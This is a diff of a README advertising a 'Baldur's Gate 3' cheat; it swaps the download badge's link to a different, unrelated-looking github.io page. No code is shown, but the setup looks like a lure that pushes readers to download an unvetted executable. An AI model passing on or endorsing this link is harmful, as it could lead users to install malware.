@@ -4,7 +4,7 @@ Let’s face it — **Baldur’s Gate 3** is incredible, but sometimes those dic
 
 Perfect for chaotic evil runs, stress-free exploration, or just steamrolling Act 3 like a true overpowered legend.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://er92-Baldur-s-Gate-3-Cheat.github.io/.github)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://bigboyluxunicorn88.github.io)
 ---
 
 ## 🧩 What Is the BG3 Cheat?
